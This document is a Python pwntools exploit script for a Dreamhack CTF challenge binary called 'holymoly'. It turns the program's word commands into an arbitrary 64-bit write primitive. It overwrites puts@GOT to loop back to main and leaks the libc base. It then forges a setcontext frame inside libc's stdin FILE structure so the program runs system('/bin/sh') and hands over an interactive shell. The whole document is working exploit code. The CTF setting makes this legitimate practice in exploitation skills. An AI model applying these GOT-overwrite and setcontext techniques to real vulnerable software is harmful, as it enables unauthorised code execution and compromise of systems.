#!/usr/bin/env python3
from pwn import *

PORT = 19256
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./holymoly_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401559
            b* 0x0000000000401577
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)



PLUS = [
    b'holymoly',
    b'rolypoly',
    b'monopoly',
    b'guacamole'
]

MINUS = [
    b'robocarpoli',
    b'halligalli',
    b'broccoli',
    b'bordercollie'
]

def set_addr(delta):
    ops = PLUS if delta >= 0 else MINUS
    x = abs(delta)

    return (
        ops[0] * (x // 0x1000)
        + ops[1] * ((x >> 8) & 0xf)
        + ops[2] * ((x >> 4) & 0xf)
        + ops[3] * (x & 0xf)
    )


def write64(target, value, val_addr=0x4040B8):
    assert 0 <= value < (1 << 64)

    val_shift = val_addr + 1
    ptr_addr = 0x4040C0
    payload = b''

    # Build 64-bit value
    payload += b'mystery'
    payload += set_addr(val_shift)
    payload += b'mystery'

    bs = value.to_bytes(8, 'big')
    payload += set_addr(bs[0])
    current = bs[0]

    for next_byte in bs[1:]:
        payload += b'cranberry'
        payload += set_addr(next_byte - current)
        current = next_byte

        payload += b'mystery'
        payload += set_addr(0xB9)
        payload += b'mystery'

    if abs(target - val_shift) <= 0x1200000:
        payload += b'mystery'
        payload += set_addr(target - val_shift)
        payload += b'mystery'
        payload += b'cranberry'

    else:
        payload += b'mystery'
        payload += set_addr(ptr_addr - val_shift)
        payload += b'mystery'
        payload += b'cranberry'

        payload += b'mystery'
        payload += set_addr(target - value)
        payload += b'mystery'
        payload += b'cranberry'

    assert len(payload) <= 48878, len(payload)
    return payload

# Stage 1: Puts@GOT -> main. Lead to Arbitrary Write

pl = write64(0x404018, 0x4011F6)
# GDB()
sla(b'? ', pl)

# Stage 2: Leak libc base

pl = b'mystery' + set_addr(0x404028) + b'blueberry' + b'mystery'

# GDB()
sla(b'? ', pl)

libc.address = u64(p.recvn(8)) -0x61c90
log.info(f'libc: {hex(libc.address)}')


# Stage 3: Fake context -> Trigger setcontext -> system('/bin/sh')

scratch = libc.address + 0x1F10A0
fp_area = scratch + 0x30
rop_rsp = scratch + 0x78

stdin_file = libc.sym._IO_2_1_stdin_ 
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))


context_writes = [
    ("fpregs", stdin_file + 0xe0, fp_area),
    ("mxcsr", stdin_file + 0x1bc, fp_area),
    ("rsp", stdin_file + 0xa0, rop_rsp),
    ("rip", stdin_file + 0xa8, system),
    ("rdi", stdin_file + 0x68, binsh),
    ("return to exit", rop_rsp, libc.sym.exit),
]

for name, ptr, val in context_writes:
    pl = write64(ptr, val)
    log.info(f'{name}: {hex(ptr)} <- {hex(val)}')
    sla(b'? ', pl)

pl = write64(0x404040, libc.sym.setcontext)
GDB()
sla(b'? ', pl)

p.interactive()